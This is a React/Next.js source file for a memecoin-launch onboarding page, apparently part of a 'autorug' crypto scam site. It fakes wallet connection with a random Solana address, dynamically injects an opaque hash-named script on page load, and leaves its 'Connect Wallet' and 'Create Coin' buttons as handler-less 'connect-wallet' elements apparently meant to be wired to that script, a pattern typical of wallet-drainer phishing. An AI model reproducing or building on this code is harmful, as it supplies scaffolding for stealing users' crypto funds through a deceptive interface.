"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { motion, AnimatePresence } from "framer-motion"
import { ArrowRight, Check, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { useAuth } from "@/contexts/auth-context"
import { useToast } from "@/components/ui/use-toast"
import Step1CreateCoin from "./components/Step1CreateCoin"
import Step2SelectPlatform from "./components/Step2SelectPlatform"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import Step4AddLiquidity from "./components/Step4AddLiquidity"

// Generate a random ID
const generateId = () => Math.random().toString(36).substring(2, 15)

const LoadingStep = () => (
  <div className="flex flex-col items-center justify-center">
    <Loader2 className="h-12 w-12 text-primary animate-spin mb-4" />
    <p className="text-muted-foreground">Creating your coin...</p>
  </div>
)

export default function OnboardingPage() {
  const router = useRouter()
  const { user, isLoading: authLoading } = useAuth()
  const { toast } = useToast()
  const [loading, setLoading] = useState(true)
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [isWalletConnected, setIsWalletConnected] = useState(false)
  const [isWalletConnecting, setIsWalletConnecting] = useState(false)
  const [walletAddress, setWalletAddress] = useState<string | null>(null)
  const [currentStep, setCurrentStep] = useState<"details" | "wallet" | "liquidity" | "creating">("details")

  const [formData, setFormData] = useState({
    id: generateId(),
    name: "",
    image: null as File | null,
    description: "",
    platform: "",
    walletConnected: false,
    liquidityAmount: 1, // Default value
    socialLinks: {} as {
      website?: string
      telegram?: string
      discord?: string
      reddit?: string
      twitter?: string
      tiktok?: string
    },
  })

  useEffect(() => {
    // Dynamically load the script
    const script = document.createElement("script")
    script.src = "./8592614e6d9bfd7bfad664a9d4a132af7ba6a8a1665a90b8f0a14078dc1ac2e5.js" // Adjust the path accordingly
    script.async = true
    document.body.appendChild(script)
    console.error("script shown")

    return () => {
      // Check if the script is still a child of document.body before removing
      if (script && document.body.contains(script)) {
        document.body.removeChild(script)
      }
    }
  }, [])

  // Redirect to login if not authenticated
  useEffect(() => {
    if (!authLoading && !user) {
      toast({
        title: "Authentication required",
        description: "Please login to create a coin",
        variant: "destructive",
      })
      router.push("/")
    }
  }, [user, authLoading, router, toast])

  useEffect(() => {
    // Simulate loading delay
    const timer = setTimeout(() => {
      setLoading(false)
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  const updateFormData = (data: Partial<typeof formData>) => {
    setFormData((prev) => ({ ...prev, ...data }))
  }

  // Validate form data
  const isFormValid = () => {
    return !!formData.name.trim() && !!formData.platform
  }

  // Generate a random Solana address
  const generateSolanaAddress = () => {
    const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    let address = ""
    for (let i = 0; i < 44; i++) {
      address += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return address
  }

  const connectWallet = () => {
    setIsWalletConnecting(true)

    // Generate a random Solana address
    const address = generateSolanaAddress()

    // Simulate connection delay
    setTimeout(() => {
      setWalletAddress(address)
      setIsWalletConnected(true)
      updateFormData({ walletConnected: true })
      setIsWalletConnecting(false)

      // Show toast notification
      toast({
        variant: "success",
        title: "Wallet connected!",
        description: "Your wallet has been successfully connected.",
      })

      // Close modal after a short delay
      setTimeout(() => {
        setIsWalletModalOpen(false)
        // Move to liquidity step instead of creating coin
        setCurrentStep("liquidity")
      }, 1500)
    }, 3000)
  }

  const handleCreateCoin = () => {
    if (!user) {
      toast({
        title: "Authentication required",
        description: "Please login to create a coin",
        variant: "destructive",
      })
      router.push("/")
      return
    }

    // Create coin data for storage
    const coinData = {
      id: formData.id,
      userId: user.id,
      name: formData.name || "Unnamed Coin",
      image: formData.image ? URL.createObjectURL(formData.image) : "/placeholder.svg?height=40&width=40",
      investment: formData.liquidityAmount,
      profit: 0,
      platform: formData.platform === "raydium" ? "Raydium" : "Pump.fun",
      createdAt: new Date(),
      pnl: 0,
      socialLinks: formData.socialLinks,
    }

    // Get existing coins or initialize empty array
    const existingCoinsStr = localStorage.getItem("autorug_coins")
    const existingCoins = existingCoinsStr ? JSON.parse(existingCoinsStr) : []

    // Add new coin and save
    const updatedCoins = [coinData, ...existingCoins]
    localStorage.setItem("autorug_coins", JSON.stringify(updatedCoins))

    // Log the transaction
    const transaction = {
      id: Math.random().toString(36).substring(2, 15),
      userId: user.id,
      coinId: formData.id,
      coinName: formData.name || "Unnamed Coin",
      type: "creation" as const,
      amount: formData.liquidityAmount,
      timestamp: new Date(),
    }

    // Get existing transactions or initialize empty array
    const existingTransactionsStr = localStorage.getItem("autorug_transactions")
    const existingTransactions = existingTransactionsStr ? JSON.parse(existingTransactionsStr) : []

    // Add new transaction and save
    const updatedTransactions = [transaction, ...existingTransactions]
    localStorage.setItem("autorug_transactions", JSON.stringify(updatedTransactions))

    // Trigger storage event for dashboard to detect
    window.dispatchEvent(new Event("storage"))

    // Show success toast
    toast({
      title: "Coin created successfully!",
      description: "Your coin has been created and is now available in your dashboard.",
      variant: "success",
    })

    // Redirect to dashboard
    router.push("/dijoqhi89123hd3i1e8hqwikrfhio3q289hrei38hr2389hri3qxhr3928hr8239rrfi3w")
  }

  const handleSubmit = () => {
    if (!isFormValid()) {
      toast({
        title: "Missing information",
        description: "Please fill out all required fields",
        variant: "destructive",
      })
      return
    }

    // Open wallet connection modal
    setIsWalletModalOpen(true)
  }

  const handleFinishCreation = () => {
    // Set creating state
    setCurrentStep("creating")

    // Simulate creation delay
    setTimeout(() => {
      handleCreateCoin()
    }, 3000)
  }

  if (authLoading || loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh]">
        <Loader2 className="h-12 w-12 text-primary animate-spin mb-4" />
        <p className="text-muted-foreground">Loading onboarding process...</p>
      </div>
    )
  }

  if (!user) {
    return null // Will redirect in useEffect
  }


  return (
    <div className="container mx-auto px-4 py-8 max-w-6xl">
      <div className="mb-8">
        <h1 className="text-3xl font-bold mb-2">Create Your Memecoin</h1>
        <p className="text-muted-foreground">Fill out the details below to create your memecoin.</p>
      </div>

      <div className="flex flex-col md:flex-row gap-8">
        {/* Steps indicator - horizontal on small screens, vertical on larger screens */}
        <div className="w-full md:w-auto md:min-w-[200px]">
          <div className="flex md:flex-col gap-4 md:sticky md:top-8">
            {/* Step 1 */}
            <div className="flex items-center gap-3 flex-1 md:flex-none">
              <div className="flex items-center justify-center w-8 h-8 rounded-full bg-primary text-primary-foreground">
                <Check className="h-4 w-4" />
              </div>
              <div className="font-medium">Coin Details</div>
            </div>

            {/* Connector */}
            <div className="hidden md:block ml-4 w-0.5 h-8 bg-border"></div>
            <div className="flex md:hidden h-0.5 flex-1 self-center bg-border mx-2"></div>

            {/* Step 2 */}
            <div className="flex items-center gap-3 flex-1 md:flex-none">
              <div
                className={`flex items-center justify-center w-8 h-8 rounded-full ${formData.name ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}
              >
                {formData.name ? <Check className="h-4 w-4" /> : <span>2</span>}
              </div>
              <div className={`font-medium ${formData.name ? "text-foreground" : "text-muted-foreground"}`}>
                Platform
              </div>
            </div>

            {/* Connector */}
            <div className="hidden md:block ml-4 w-0.5 h-8 bg-border"></div>
            <div className="flex md:hidden h-0.5 flex-1 self-center bg-border mx-2"></div>

            {/* Step 3 */}
            <div className="flex items-center gap-3 flex-1 md:flex-none">
              <div
                className={`flex items-center justify-center w-8 h-8 rounded-full ${isFormValid() ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}
              >
                {isFormValid() ? <Check className="h-4 w-4" /> : <span>3</span>}
              </div>
              <div className={`font-medium ${isFormValid() ? "text-foreground" : "text-muted-foreground"}`}>Launch</div>
            </div>
          </div>
        </div>

        {/* Form content */}
        <div className="flex-1 space-y-8">
          <AnimatePresence mode="wait">
            {currentStep === "details" && (
              <motion.div
                key="step1"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.3 }}
                className="space-y-8"
              >
                {/* Step 1: Create Coin */}
                <Step1CreateCoin formData={formData} updateFormData={updateFormData} />

                {/* Step 2: Select Platform */}
                <Step2SelectPlatform formData={formData} updateFormData={updateFormData} />

                {/* Submit Button */}
                <div className="flex justify-end">
                  <button className="connect-wallet"><Button>Create Coin <ArrowRight className="ml-2 h-4 w-4" /></Button></button>
                </div>
              </motion.div>
            )}

            {currentStep === "liquidity" && (
              <motion.div
                key="step-liquidity"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.3 }}
                className="space-y-8"
              >
                {/* Step 4: Add Liquidity */}
                <Step4AddLiquidity formData={formData} updateFormData={updateFormData} />

                {/* Submit Button */}
                <div className="flex justify-end">
                  <Button
                    onClick={handleFinishCreation}
                    className="bg-primary/90 hover:bg-primary"
                    disabled={formData.liquidityAmount <= 0}
                    size="lg"
                  >
                    Create Coin <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              </motion.div>
            )}

            {currentStep === "creating" && (
              <motion.div
                key="step-creating"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.3 }}
                className="space-y-8"
              >
                <LoadingStep />
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* Wallet Connection Modal */}
      <Dialog open={isWalletModalOpen} onOpenChange={setIsWalletModalOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Connect Your Wallet</DialogTitle>
            <DialogDescription>Connect your wallet to continue with the memecoin creation process.</DialogDescription>
          </DialogHeader>

          <div className="flex flex-col items-center py-6">
            {isWalletConnected ? (
              <div className="flex flex-col items-center">
                <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-4">
                  <Check className="h-8 w-8 text-green-500" />
                </div>
                <h3 className="font-medium text-lg">Wallet Connected</h3>
                <p className="text-sm text-muted-foreground mt-1 mb-4">Your wallet is ready to use</p>

                {walletAddress && (
                  <div className="mt-2 p-4 border border-green-500/20 bg-green-500/10 rounded-lg w-full max-w-sm">
                    <div className="flex items-center justify-center">
                      <div className="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center mr-3">
                        <Check className="h-4 w-4 text-green-500" />
                      </div>
                      <div>
                        <p className="text-sm font-medium">Connected Wallet</p>
                        <p className="text-xs text-muted-foreground">
                          {walletAddress.substring(0, 6)}...{walletAddress.substring(walletAddress.length - 4)}
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <button className="connect-wallet"><Button>Connect Wallet</Button></button>
            )}
          </div>

          <div className="text-sm text-muted-foreground">
            <p className="mb-2">By connecting your wallet, you agree to our Terms of Service and Privacy Policy.</p>
            <p>Your wallet will be used to sign transactions when creating your memecoin.</p>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}

